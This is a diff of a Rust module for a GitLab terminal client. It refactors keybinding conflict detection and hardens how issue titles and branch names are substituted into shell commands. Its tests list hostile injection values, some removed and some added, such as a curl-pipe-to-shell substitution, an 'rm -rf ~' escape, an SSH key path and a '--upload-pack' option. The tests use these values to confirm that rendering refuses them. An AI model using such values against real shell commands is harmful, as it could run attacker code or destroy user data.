@@ -4,213 +4,41 @@
 
 use crate::app::Tab;
 use crate::config::{Config, CustomKeybinding};
-use crate::keybinding::{binding_key_event, keybinding_matches};
-use crossterm::event::KeyEvent;
+use crate::keybinding::{KeyPress, binding_key_event, keybinding_matches};
+use crate::keymap::{Action, DIFF_VIEW_GLOBAL_ACTIONS, KeyContext, tab_table};
 
-/// Keys the list view handles in code whatever the config says, so a custom
-/// binding on one of them never fires. These check the exact modifiers.
-const LIST_VIEW_EXACT_KEYS: &[(&str, &str)] = &[
-    ("Ctrl+c", "quit"),
-    ("Ctrl+s", "switch repository"),
-    ("Ctrl+r", "refresh"),
-    ("u", "check for updates"),
-    ("f", "search"),
+/// Characters a POSIX shell, bash or zsh acts on in an unquoted word: quoting,
+/// substitution, separators, redirection, globbing, brace and tilde expansion,
+/// comments and assignments. A template value holding one could run commands
+/// or pass words the user never wrote, so it is refused. Whitespace and
+/// control characters, which split words or end the command, are refused too.
+const SHELL_SIGNIFICANT_CHARACTERS: &[char] = &[
+    '`', '$', ';', '&', '|', '<', '>', '(', ')', '\\', '"', '\'', '~', '*', '?', '[', ']', '{',
+    '}', '#', '=',
 ];
-
-/// Hard-wired list-view keys matched on the key code alone, so any modified
-/// spelling (`Ctrl+q`, `Alt+j`) is taken too.
-const LIST_VIEW_CODE_KEYS: &[(&str, &str)] = &[
-    ("q", "quit / close details"),
-    ("?", "help"),
-    ("F1", "help"),
-    ("F5", "refresh"),
-    (",", "configure columns"),
-    ("Esc", "back"),
-    ("Backspace", "back"),
-    ("Enter", "open details"),
-    ("l", "next tab"),
-    ("Right", "next tab"),
-    ("h", "previous tab"),
-    ("Left", "previous tab"),
-    ("j", "next row"),
-    ("Down", "next row"),
-    ("k", "previous row"),
-    ("Up", "previous row"),
-    ("Home", "first row"),
-    ("End", "last row"),
-    ("J", "scroll details"),
-    ("K", "scroll details"),
-];
-
-/// Global bindings that act only inside an overlay, never on the list view.
-const OVERLAY_ONLY_GLOBAL_ACTIONS: &[&str] = &["submit_edit"];
-
-/// Characters that end a quoted string or start a command substitution,
-/// separator or redirection in a POSIX shell. A template value holding one
-/// could run commands the user never wrote, so it is refused.
-const SHELL_METACHARACTERS: &[char] =
-    &['`', '$', ';', '&', '|', '<', '>', '(', ')', '\\', '"', '\''];
 
 const ENVIRONMENT_PREFIX: &str = "GLAB_TUI_";
 
-/// Keys hard-wired in a tab's handler next to their configurable binding,
-/// matched on the key code alone.
-fn tab_hardwired_keys(tab: Tab) -> &'static [(&'static str, &'static str)] {
-    match tab {
-        Tab::Issues => &[("M", "jump to related MRs")],
-        Tab::MergeRequests => &[
-            ("A", "revoke approval"),
-            ("R", "rebase"),
-            ("D", "view diff"),
-            ("P", "view related pipelines"),
-        ],
-        Tab::Pipelines => &[
-            ("Space", "select pipeline"),
-            ("r", "retry"),
-            ("W", "open workflow"),
-        ],
-        Tab::Jobs => &[("S", "start job")],
-        _ => &[],
-    }
-}
-
-/// Hard-wired tab keys that check the exact modifiers.
-fn tab_hardwired_exact_keys(tab: Tab) -> &'static [(&'static str, &'static str)] {
-    match tab {
-        Tab::Pipelines => &[("d", "cancel")],
-        _ => &[],
-    }
-}
-
-/// Whether `event` has the key code `binding` names, whatever its modifiers.
-fn same_key_code(binding: &str, event: &KeyEvent) -> bool {
-    binding_key_event(binding).is_some_and(|bound| bound.code == event.code)
-}
-
-/// The `[keybindings.<table>]` a tab's handler reads, with its bindings.
-fn tab_keybindings(config: &Config, tab: Tab) -> (&'static str, Option<toml::Value>) {
-    let keybindings = &config.keybindings;
-    let (table, bindings) = match tab {
-        Tab::Issues => ("issues", toml::Value::try_from(&keybindings.issues)),
-        Tab::MergeRequests => ("mrs", toml::Value::try_from(&keybindings.mrs)),
-        Tab::Pipelines => ("pipelines", toml::Value::try_from(&keybindings.pipelines)),
-        Tab::Jobs => ("jobs", toml::Value::try_from(&keybindings.jobs)),
-        Tab::Runners => ("runners", toml::Value::try_from(&keybindings.runners)),
-        Tab::Releases => ("releases", toml::Value::try_from(&keybindings.releases)),
-        Tab::Todos => ("todos", toml::Value::try_from(&keybindings.todos)),
-        Tab::Milestones => ("milestones", toml::Value::try_from(&keybindings.milestones)),
-        Tab::Branches => ("branches", toml::Value::try_from(&keybindings.branches)),
-        Tab::Environments => (
-            "environments",
-            toml::Value::try_from(&keybindings.environments),
-        ),
-        Tab::Terminal => ("terminal", toml::Value::try_from(&keybindings.terminal)),
-    };
-    (table, bindings.ok())
-}
-
-/// Name of the first `field = "binding"` in `bindings` that `event` triggers.
-fn matching_field<'a>(
-    bindings: &'a toml::Value,
-    event: &KeyEvent,
-    ignored: &[&str],
-) -> Option<&'a str> {
-    bindings.as_table()?.iter().find_map(|(field, binding)| {
-        let is_match = !ignored.contains(&field.as_str())
-            && binding
-                .as_str()
-                .is_some_and(|binding| keybinding_matches(binding, event));
-        is_match.then_some(field.as_str())
-    })
-}
-
 /// The built-in action that takes `event` on `tab`'s list view before any
 /// custom binding is consulted.
-fn builtin_action(config: &Config, tab: Tab, event: &KeyEvent) -> Option<String> {
-    if let Some(global) = toml::Value::try_from(&config.keybindings.global).ok()
-        && let Some(field) = matching_field(&global, event, OVERLAY_ONLY_GLOBAL_ACTIONS)
-    {
-        return Some(format!("keybindings.global.{field}"));
-    }
-    let (table, bindings) = tab_keybindings(config, tab);
-    if let Some(field) = bindings
-        .as_ref()
-        .and_then(|bindings| matching_field(bindings, event, &[]))
-    {
-        return Some(format!("keybindings.{table}.{field}"));
-    }
-    let exact = LIST_VIEW_EXACT_KEYS
-        .iter()
-        .chain(tab_hardwired_exact_keys(tab))
-        .find(|(binding, _)| keybinding_matches(binding, event));
-    let by_code = || {
-        LIST_VIEW_CODE_KEYS
-            .iter()
-            .chain(tab_hardwired_keys(tab))
-            .find(|(binding, _)| same_key_code(binding, event))
-    };
-    exact
-        .or_else(by_code)
-        .map(|(binding, action)| format!("the built-in \"{binding}\" ({action})"))
+fn builtin_action(config: &Config, tab: Tab, event: &KeyPress) -> Option<Action> {
+    [
+        KeyContext::Global,
+        KeyContext::Tab(tab),
+        KeyContext::ListView,
+    ]
+    .into_iter()
+    .find_map(|context| config.keybindings.resolve(context, event))
 }
 
 /// The built-in action that takes `event` in the diff view before any custom
-/// binding. The diff view matches plain key codes regardless of modifiers,
-/// so `Ctrl+d` is taken by `d` just like `d` itself.
-fn diff_view_action(config: &Config, event: &KeyEvent) -> Option<String> {
-    use crossterm::event::{KeyCode, KeyModifiers};
-    let global = &config.keybindings.global;
-    for (field, binding) in [
-        ("quit", &global.quit),
-        ("help", &global.help),
-        ("refresh", &global.refresh),
-        ("switch_repo", &global.switch_repo),
-    ] {
-        if keybinding_matches(binding, event) {
-            return Some(format!("keybindings.global.{field}"));
-        }
-    }
-    if let Some((binding, action)) = ["Ctrl+c", "Ctrl+s", "Ctrl+r", "F1", "F5"]
-        .into_iter()
-        .zip(["quit", "switch repository", "refresh", "help", "refresh"])
-        .find(|(binding, _)| keybinding_matches(binding, event))
-    {
-        return Some(format!("the built-in \"{binding}\" ({action})"));
-    }
-    let action = match event.code {
-        KeyCode::Char('n') if event.modifiers.contains(KeyModifiers::CONTROL) => "next match",
-        KeyCode::Char('N') => "previous match",
-        KeyCode::Char('q') | KeyCode::Esc => "back",
-        KeyCode::Tab => "switch focus",
-        KeyCode::Char('h' | 'l' | 'j' | 'k' | 'J' | 'K')
-        | KeyCode::Left
-        | KeyCode::Right
-        | KeyCode::Up
-        | KeyCode::Down => "navigate",
-        KeyCode::Enter | KeyCode::Char(' ') => "open",
-        KeyCode::Char('z' | 'Z') => "fold files",
-        KeyCode::Char('m' | 'M') => "reviewed marks",
-        KeyCode::Char('[' | ']') => "previous / next hunk",
-        KeyCode::Char('d') => "toggle side-by-side",
-        KeyCode::Char('/' | 'f') => "search",
-        KeyCode::Char('v' | 'V') => "select lines",
-        KeyCode::Char('a' | 'c' | 'C' | 'r' | 'e') => "comments",
-        KeyCode::Char('T') => "review threads",
-        _ => return None,
-    };
-    Some(format!(
-        "the diff view's \"{}\" ({action})",
-        key_label(event)
-    ))
-}
-
-fn key_label(event: &KeyEvent) -> String {
-    use crossterm::event::KeyCode;
-    match event.code {
-        KeyCode::Char(' ') => "Space".to_string(),
-        KeyCode::Char(c) => c.to_string(),
-        code => format!("{code:?}"),
-    }
+/// binding.
+fn diff_view_action(config: &Config, event: &KeyPress) -> Option<Action> {
+    DIFF_VIEW_GLOBAL_ACTIONS
+        .iter()
+        .copied()
+        .find(|action| config.keybindings.matches(*action, event))
+        .or_else(|| config.keybindings.resolve(KeyContext::DiffView, event))
 }
 
 /// The pane a custom keybinding table belongs to.
@@ -219,6 +47,9 @@ pub enum CommandPane {
     Universal,
     Issues,
     MergeRequests,
+    Pipelines,
+    Jobs,
+    Branches,
     /// The MR/PR diff view, which is not a tab.
     Diff,
 }
@@ -226,9 +57,12 @@ pub enum CommandPane {
 impl CommandPane {
     /// Pane-specific tables first: on a shared key the more specific binding
     /// wins over a universal one.
-    const LOOKUP_ORDER: [CommandPane; 4] = [
+    const LOOKUP_ORDER: [CommandPane; 7] = [
         CommandPane::Issues,
         CommandPane::MergeRequests,
+        CommandPane::Pipelines,
+        CommandPane::Jobs,
+        CommandPane::Branches,
         CommandPane::Diff,
         CommandPane::Universal,
     ];
@@ -238,6 +72,9 @@ impl CommandPane {
             CommandPane::Universal => "custom_keybindings.universal",
             CommandPane::Issues => "custom_keybindings.issues",
             CommandPane::MergeRequests => "custom_keybindings.mrs",
+            CommandPane::Pipelines => "custom_keybindings.pipelines",
+            CommandPane::Jobs => "custom_keybindings.jobs",
+            CommandPane::Branches => "custom_keybindings.branches",
             CommandPane::Diff => "custom_keybindings.diff",
         }
     }
@@ -261,6 +98,11 @@ impl CommandPane {
                 "BaseRefName",
                 "Author",
             ],
+            CommandPane::Pipelines => &["RepoName", "RepoPath", "PipelineId", "Ref", "Sha"],
+            CommandPane::Jobs => &[
+                "RepoName", "RepoPath", "JobId", "JobName", "Stage", "Status",
+            ],
+            CommandPane::Branches => &["RepoName", "RepoPath", "BranchName", "CommitSha"],
             CommandPane::Diff => &[
                 "RepoName",
                 "RepoPath",
@@ -280,6 +122,9 @@ impl CommandPane {
             CommandPane::Universal => true,
             CommandPane::Issues => tab == Tab::Issues,
             CommandPane::MergeRequests => tab == Tab::MergeRequests,
+            CommandPane::Pipelines => tab == Tab::Pipelines,
+            CommandPane::Jobs => tab == Tab::Jobs,
+            CommandPane::Branches => tab == Tab::Branches,
             CommandPane::Diff => false,
         }
     }
@@ -290,6 +135,9 @@ impl CommandPane {
             CommandPane::Universal => &tables.universal,
             CommandPane::Issues => &tables.issues,
             CommandPane::MergeRequests => &tables.mrs,
+            CommandPane::Pipelines => &tables.pipelines,
+            CommandPane::Jobs => &tables.jobs,
+            CommandPane::Branches => &tables.branches,
             CommandPane::Diff => &tables.diff,
         }
     }
@@ -321,7 +169,7 @@ impl CustomCommand {
     }
 }
 
-/// A custom keybinding entry that is ignored or only partly usable.
+/// A keybinding entry in the config that is ignored or only partly usable.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct ConfigProblem {
     /// Which entry: its table, position and key.
@@ -345,7 +193,9 @@ impl CustomCommands {
             .keys()
             .map(|pane| ConfigProblem {
                 binding: format!("[custom_keybindings.{pane}]"),
-                problem: "unsupported pane; use universal, issues, mrs or diff".to_string(),
+                problem:
+                    "unsupported pane; use universal, issues, mrs, pipelines, jobs, branches or diff"
+                        .to_string(),
             })
             .collect();
 
@@ -378,7 +228,7 @@ impl CustomCommands {
     }
 
     /// The command `event` runs on `tab`, if a custom binding claims it.
-    pub fn find(&self, tab: Tab, event: &KeyEvent) -> Option<&CustomCommand> {
+    pub fn find(&self, tab: Tab, event: &KeyPress) -> Option<&CustomCommand> {
         self.commands
             .iter()
             .find(|command| command.is_reachable_on(tab) && keybinding_matches(&command.key, event))
@@ -392,7 +242,7 @@ impl CustomCommands {
     }
 
     /// The diff-view command `event` runs, if a custom binding claims it.
-    pub fn find_in_diff(&self, event: &KeyEvent) -> Option<&CustomCommand> {
+    pub fn find_in_diff(&self, event: &KeyPress) -> Option<&CustomCommand> {
         self.in_diff()
             .find(|command| keybinding_matches(&command.key, event))
     }
@@ -402,18 +252,6 @@ impl CustomCommands {
         self.commands
             .iter()
             .filter(|command| command.pane == CommandPane::Diff)
-    }
-
-    /// Plain-character keys, which the key-sequence timeout must still
-    /// dispatch when they double as the prefix of a two-key binding.
-    pub fn character_keys(&self) -> impl Iterator<Item = char> + '_ {
-        self.commands.iter().filter_map(|command| {
-            let mut chars = command.key.chars();
-            match (chars.next(), chars.next()) {
-                (Some(c), None) => Some(c),
-                _ => None,
-            }
-        })
     }
 }
 
@@ -432,6 +270,7 @@ fn validate(
         return Err("missing `command`".to_string());
     }
     let event = binding_key_event(&binding.key)
+        .map(KeyPress::Key)
         .ok_or_else(|| format!("\"{}\" is not a key glab-tui can bind", binding.key))?;
     for argument in template_argument_names(&binding.command)? {
         if !pane.template_arguments().contains(&argument) {
@@ -459,7 +298,10 @@ fn validate(
     };
     if pane == CommandPane::Diff {
         return match diff_view_action(config, &event) {
-            Some(action) => Err(format!("never runs: {action} takes the key first")),
+            Some(action) => Err(format!(
+                "never runs: {} takes the key first",
+                action.config_key()
+            )),
             None => Ok((command, None)),
         };
     }
@@ -468,7 +310,7 @@ fn validate(
         .into_iter()
         .filter(|tab| pane.applies_to(*tab))
         .collect();
-    let mut builtin_shadows: Vec<(Tab, String)> = Vec::new();
+    let mut builtin_shadows: Vec<(Tab, Action)> = Vec::new();
     let mut shadowed_on: Vec<Tab> = Vec::new();
     for tab in &tabs {
         if let Some(action) = builtin_action(config, *tab, &event) {
@@ -481,10 +323,11 @@ fn validate(
         }
     }
 
-    let mut actions: Vec<&str> = Vec::new();
+    let mut actions: Vec<String> = Vec::new();
     for (_, action) in &builtin_shadows {
-        if !actions.contains(&action.as_str()) {
-            actions.push(action);
+        let config_key = action.config_key();
+        if !actions.contains(&config_key) {
+            actions.push(config_key);
         }
     }
     let shadow_problem = if builtin_shadows.len() == tabs.len() {
@@ -497,7 +340,7 @@ fn validate(
     } else {
         let shadowed_tables: Vec<&str> = builtin_shadows
             .iter()
-            .map(|(tab, _)| tab_keybindings(config, *tab).0)
+            .map(|(tab, _)| tab_table(*tab))
             .collect();
         Some(format!(
             "does not run on the {} tab(s): {} takes the key first",
@@ -619,7 +462,8 @@ impl TemplateValues {
 }
 
 /// Substitutes `values` into `template`. Fails when a referenced argument is
-/// unavailable or holds a shell metacharacter.
+/// unavailable, starts with `-` or `+`, or holds whitespace or a character the
+/// shell interprets, since issue titles and branch names are third-party text.
 pub fn render(template: &str, values: &TemplateValues) -> Result<String, String> {
     let mut rendered = String::with_capacity(template.len());
     for segment in parse_template(template)? {
@@ -637,12 +481,18 @@ pub fn render(template: &str, values: &TemplateValues) -> Result<String, String>
             }
             None => return Err(format!("{{{{.{argument}}}}} is unavailable here")),
         };
-        if let Some(unsafe_char) = value
-            .chars()
-            .find(|c| SHELL_METACHARACTERS.contains(c) || c.is_control())
-        {
+        if let Some(prefix) = value.chars().next().filter(|c| matches!(c, '-' | '+')) {
             return Err(format!(
-                "{{{{.{argument}}}}} contains the shell metacharacter {unsafe_char:?}; \
+                "{{{{.{argument}}}}} starts with '{prefix}', so the command could read it as an option; \
+                 pass -- \"${}\" in the command instead",
+                environment_variable(argument)
+            ));
+        }
+        if let Some(unsafe_char) = value.chars().find(|c| {
+            SHELL_SIGNIFICANT_CHARACTERS.contains(c) || c.is_whitespace() || c.is_control()
+        }) {
+            return Err(format!(
+                "{{{{.{argument}}}}} contains {unsafe_char:?}, which the shell would interpret; \
                  use \"${}\" in the command instead",
                 environment_variable(argument)
             ));
@@ -671,7 +521,6 @@ pub fn shell_process(command: &str) -> std::process::Command {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crossterm::event::{KeyCode, KeyModifiers};
 
     fn config_with(custom_keybindings: &str) -> Config {
         let custom: crate::config::CustomKeybindingConfig =
@@ -682,8 +531,8 @@ mod tests {
         }
     }
 
-    fn key(c: char) -> KeyEvent {
-        binding_key_event(&c.to_string()).expect("plain character key")
+    fn key(c: char) -> KeyPress {
+        KeyPress::Key(binding_key_event(&c.to_string()).expect("plain character key"))
     }
 
     fn values(pairs: &[(&'static str, &str)]) -> TemplateValues {
@@ -806,7 +655,7 @@ key = "g"
 command = "lazygit"
 "#,
         );
-        config.keybindings.global.jump_to_id = "Ctrl+j".to_string();
+        config.keybindings.set(Action::GlobalJumpToId, &["Ctrl+j"]);
 
         let (commands, problems) = CustomCommands::load(&config);
         assert_eq!(problems, vec![]);
@@ -831,16 +680,44 @@ command = "true"
         assert_eq!(
             reasons,
             vec![
-                "never runs: the built-in \"j\" (next row) takes the key first",
+                "never runs: keybindings.list.next_row takes the key first",
                 "never runs: keybindings.mrs.view_diff takes the key first",
             ]
         );
     }
 
-    /// The list view matches these keys by key code alone, so `Ctrl+q`
-    /// quits and `Alt+r` retries a pipeline instead of running the command.
     #[test]
-    fn modified_spelling_of_a_code_matched_list_key_is_reported() {
+    fn jobs_binding_runs_only_on_the_jobs_tab_and_yields_to_its_builtins() {
+        let config = config_with(
+            r#"
+[[jobs]]
+key = "L"
+command = "echo {{.JobId}} {{.Stage}}"
+[[jobs]]
+key = "E"
+command = "true"
+[[jobs]]
+key = "X"
+command = "echo {{.PrNumber}}"
+"#,
+        );
+        let (commands, problems) = CustomCommands::load(&config);
+
+        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
+        assert_eq!(
+            reasons,
+            vec![
+                "never runs: keybindings.jobs.jump_to_failure takes the key first",
+                "{{.PrNumber}} is not available in custom_keybindings.jobs; \
+                 use RepoName, RepoPath, JobId, JobName, Stage, Status",
+            ]
+        );
+        assert!(commands.find(Tab::Jobs, &key('L')).is_some());
+        assert!(commands.find(Tab::Pipelines, &key('L')).is_none());
+    }
+
+    #[test]
+    fn modified_spelling_of_a_list_key_runs_the_custom_binding() {
         let config = config_with(
             r#"
 [[universal]]
@@ -852,27 +729,20 @@ command = "true"
 [[universal]]
 key = "Alt+r"
 command = "true"
-[[universal]]
-key = "Ctrl+t"
-command = "true"
 "#,
         );
         let (commands, problems) = CustomCommands::load(&config);
 
-        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
-        assert_eq!(
-            reasons,
-            vec![
-                "never runs: the built-in \"q\" (quit / close details) takes the key first",
-                "never runs: the built-in \"k\" (previous row) takes the key first",
-                "does not run on the pipelines tab(s): the built-in \"r\" (retry) takes the key first",
-            ]
-        );
-        assert!(
-            commands
-                .find(Tab::Issues, &binding_key_event("Ctrl+t").unwrap())
-                .is_some()
-        );
+        assert_eq!(problems, vec![]);
+        for binding in ["Ctrl+q", "Alt+k", "Alt+r"] {
+            let press = KeyPress::Key(binding_key_event(binding).expect("bindable"));
+            assert_eq!(
+                commands
+                    .find(Tab::Pipelines, &press)
+                    .map(|command| command.key.as_str()),
+                Some(binding)
+            );
+        }
     }
 
     #[test]
@@ -955,7 +825,7 @@ command = "echo one"
 [[issues]]
 key = "Z"
 command = "echo two"
-[[pipelines]]
+[[runners]]
 key = "p"
 command = "true"
 "#,
@@ -966,7 +836,7 @@ command = "true"
         assert_eq!(
             reasons,
             vec![
-                "unsupported pane; use universal, issues, mrs or diff",
+                "unsupported pane; use universal, issues, mrs, pipelines, jobs, branches or diff",
                 "missing `key`",
                 "\"gg\" is not a key glab-tui can bind",
                 "{{.PrNumber}} is not available in custom_keybindings.issues; \
@@ -1011,17 +881,45 @@ command = "nvim {{.FilePath}}"
         );
     }
 
-    /// The diff view matches key codes whatever the modifiers, so a
-    /// `Ctrl+d` custom key would toggle side-by-side instead of running.
     #[test]
-    fn diff_binding_on_a_diff_view_key_is_dropped_even_with_a_modifier() {
+    fn pipelines_bindings_run_only_on_the_pipelines_tab_with_pipeline_arguments() {
+        let config = config_with(
+            r#"
+[[pipelines]]
+key = "x"
+command = "open-ci {{.RepoName}} {{.PipelineId}} {{.Ref}} {{.Sha}}"
+[[pipelines]]
+key = "z"
+command = "echo {{.PrNumber}}"
+[[pipelines]]
+key = "R"
+command = "true"
+"#,
+        );
+        let (commands, problems) = CustomCommands::load(&config);
+
+        assert!(commands.find(Tab::Pipelines, &key('x')).is_some());
+        assert!(commands.find(Tab::Jobs, &key('x')).is_none());
+        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
+        assert_eq!(
+            reasons,
+            vec![
+                "{{.PrNumber}} is not available in custom_keybindings.pipelines; \
+                 use RepoName, RepoPath, PipelineId, Ref, Sha",
+                "never runs: keybindings.pipelines.retry_failed takes the key first",
+            ]
+        );
+    }
+
+    #[test]
+    fn diff_binding_on_a_diff_view_key_is_dropped_but_a_modified_spelling_runs() {
         let config = config_with(
             r#"
 [[diff]]
 key = "d"
 command = "true"
 [[diff]]
-key = "Ctrl+d"
+key = "Alt+d"
 command = "true"
 [[diff]]
 key = "Ctrl+o"
@@ -1033,18 +931,123 @@ command = "true"
         let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
         assert_eq!(
             reasons,
-            vec![
-                "never runs: the diff view's \"d\" (toggle side-by-side) takes the key first",
-                "never runs: the diff view's \"d\" (toggle side-by-side) takes the key first",
-            ]
+            vec!["never runs: keybindings.diff.toggle_side_by_side takes the key first"]
         );
         assert_eq!(
             commands
                 .in_diff()
                 .map(|c| c.key.as_str())
                 .collect::<Vec<_>>(),
-            vec!["Ctrl+o"]
+            vec!["Alt+d", "Ctrl+o"]
         );
+    }
+
+    #[test]
+    fn every_builtin_key_of_a_pane_is_reported_when_a_custom_binding_claims_it() {
+        for (pane, context) in [
+            ("issues", KeyContext::Tab(Tab::Issues)),
+            ("mrs", KeyContext::Tab(Tab::MergeRequests)),
+            ("pipelines", KeyContext::Tab(Tab::Pipelines)),
+            ("jobs", KeyContext::Tab(Tab::Jobs)),
+            ("branches", KeyContext::Tab(Tab::Branches)),
+            ("diff", KeyContext::DiffView),
+        ] {
+            for action in Action::in_context(context) {
+                for key in action.spec().defaults {
+                    let config = config_with(&format!(
+                        "[[{pane}]]\nkey = \"{key}\"\ncommand = \"true\"\n"
+                    ));
+                    let (_, problems) = CustomCommands::load(&config);
+                    assert_eq!(
+                        problems.len(),
+                        1,
+                        "custom {pane} key {key:?} must be reported as taken by {}",
+                        action.config_key()
+                    );
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn remapping_a_diff_action_frees_its_key_for_a_custom_binding() {
+        let mut config = config_with("[[diff]]\nkey = \"d\"\ncommand = \"true\"\n");
+        config
+            .keybindings
+            .set(Action::DiffToggleSideBySide, &["Alt+s"]);
+
+        let (commands, problems) = CustomCommands::load(&config);
+        assert_eq!(problems, vec![]);
+        assert!(commands.find_in_diff(&key('d')).is_some());
+    }
+
+    #[test]
+    fn diff_binding_on_a_half_page_key_is_dropped() {
+        let config = config_with("[[diff]]\nkey = \"Ctrl+u\"\ncommand = \"true\"\n");
+        let (commands, problems) = CustomCommands::load(&config);
+
+        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
+        assert_eq!(
+            reasons,
+            vec!["never runs: keybindings.global.scroll_half_page_up takes the key first"]
+        );
+        assert_eq!(commands.in_diff().count(), 0);
+    }
+
+    /// Whether a `[[diff]]` command bound to `key` runs when `key` is pressed
+    /// in a freshly opened diff.
+    fn diff_command_runs(key: &str) -> bool {
+        let mut app = crate::app::App::default();
+        // An empty diff stops a diff command at "the cursor is not on a file",
+        // which logs it without starting a shell.
+        app.diff_view = Some(crate::app::DiffView::new(
+            1,
+            "owner/repo".to_string(),
+            String::new(),
+        ));
+        app.custom_commands = CustomCommands {
+            commands: vec![CustomCommand {
+                pane: CommandPane::Diff,
+                key: key.to_string(),
+                name: None,
+                command: "true".to_string(),
+                background: false,
+                shadowed_on: Vec::new(),
+            }],
+        };
+        let press = KeyPress::Key(binding_key_event(key).expect("bindable key"));
+
+        crate::update::update(&mut app, crate::event::Event::KeyPress(press));
+
+        app.terminal_commands.iter().any(|entry| {
+            entry
+                .command
+                .starts_with(crate::app::CUSTOM_COMMAND_LOG_PREFIX)
+        })
+    }
+
+    #[test]
+    fn diff_shadow_report_matches_what_the_key_router_lets_through() {
+        let _home = crate::config::isolate_home();
+        assert!(
+            diff_command_runs("Alt+z"),
+            "a free key must reach the command"
+        );
+        let config = Config::default();
+        for action in
+            Action::in_context(KeyContext::Global).chain(Action::in_context(KeyContext::DiffView))
+        {
+            for key in action.spec().defaults {
+                let press = KeyPress::Key(binding_key_event(key).expect("bindable default"));
+                let is_reported = diff_view_action(&config, &press).is_some();
+                assert_eq!(
+                    diff_command_runs(key),
+                    !is_reported,
+                    "{} default {key:?}: the shadow report disagrees with the key router",
+                    action.config_key()
+                );
+            }
+        }
     }
 
     #[test]
@@ -1055,7 +1058,7 @@ command = "true"
         let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
         assert_eq!(
             reasons,
-            vec!["never runs: the diff view's \"T\" (review threads) takes the key first"]
+            vec!["never runs: keybindings.diff.review_threads takes the key first"]
         );
         assert_eq!(commands.in_diff().count(), 0);
     }
@@ -1070,31 +1073,6 @@ command = "true"
 
         assert_eq!(problems, vec![]);
         assert!(commands.in_diff().count() > 0);
-    }
-
-    #[test]
-    fn character_keys_lists_only_plain_character_bindings() {
-        let config = config_with(
-            r#"
-[[universal]]
-key = "x"
-command = "true"
-[[universal]]
-key = "Ctrl+t"
-command = "true"
-"#,
-        );
-        let (commands, _) = CustomCommands::load(&config);
-        assert_eq!(commands.character_keys().collect::<Vec<_>>(), vec!['x']);
-        assert_eq!(
-            commands
-                .find(
-                    Tab::Issues,
-                    &KeyEvent::new(KeyCode::Char('t'), KeyModifiers::CONTROL)
-                )
-                .map(|c| c.key.as_str()),
-            Some("Ctrl+t")
-        );
     }
 
     #[test]
@@ -1129,34 +1107,67 @@ command = "true"
     }
 
     /// A title or a fork's branch name is attacker-controlled text; spliced
-    /// raw into `sh -c` it could run commands the user never wrote.
+    /// raw into `sh -c` it could run commands or pass words the user never
+    /// wrote.
     #[test]
-    fn render_refuses_values_that_could_escape_into_the_shell() {
-        for hostile in [
-            "x'; rm -rf ~ #",
-            "$(curl evil | sh)",
-            "`id`",
-            "a && b",
-            "a\nb",
-            "say \"hi\"",
+    fn render_refuses_values_the_shell_would_interpret() {
+        for (hostile, offending) in [
+            ("x';rm", "'\\''"),
+            ("$(curl)", "'$'"),
+            ("`id`", "'`'"),
+            ("a&&b", "'&'"),
+            ("a\nb", "'\\n'"),
+            ("say\"hi\"", "'\"'"),
+            ("fix crash", "' '"),
+            ("a\tb", "'\\t'"),
+            ("~/.ssh/authorized_keys", "'~'"),
+            ("*", "'*'"),
+            ("file?", "'?'"),
+            ("[WIP]", "'['"),
+            ("x]", "']'"),
+            ("{a,b}", "'{'"),
+            ("crash#12", "'#'"),
+            ("PATH=/tmp", "'='"),
         ] {
-            let result = render(
-                "echo '{{.IssueTitle}}'",
-                &values(&[("IssueTitle", hostile)]),
+            assert_eq!(
+                render("echo {{.IssueTitle}}", &values(&[("IssueTitle", hostile)])),
+                Err(format!(
+                    "{{{{.IssueTitle}}}} contains {offending}, which the shell would interpret; \
+                     use \"$GLAB_TUI_ISSUE_TITLE\" in the command instead"
+                )),
+                "value {hostile:?}"
             );
-            let error = result.expect_err(hostile);
-            assert!(
-                error.contains("\"$GLAB_TUI_ISSUE_TITLE\""),
-                "error must point at the safe variable: {error}"
+        }
+    }
+
+    #[test]
+    fn render_refuses_values_that_start_like_an_option() {
+        for (hostile, prefix) in [
+            ("-o", '-'),
+            ("--upload-pack=evil", '-'),
+            ("-", '-'),
+            ("+!make", '+'),
+            ("+5", '+'),
+        ] {
+            assert_eq!(
+                render(
+                    "some-tool {{.IssueTitle}}",
+                    &values(&[("IssueTitle", hostile)])
+                ),
+                Err(format!(
+                    "{{{{.IssueTitle}}}} starts with '{prefix}', so the command could read it as an option; \
+                     pass -- \"$GLAB_TUI_ISSUE_TITLE\" in the command instead"
+                )),
+                "value {hostile:?}"
             );
         }
         assert_eq!(
             render(
-                "echo {{.IssueTitle}}",
-                &values(&[("IssueTitle", "[WIP] Fix crash #12, 100% done!")])
+                "git switch {{.HeadRefName}}",
+                &values(&[("HeadRefName", "fix/crash-12")])
             )
             .as_deref(),
-            Ok("echo [WIP] Fix crash #12, 100% done!")
+            Ok("git switch fix/crash-12")
         );
     }
 
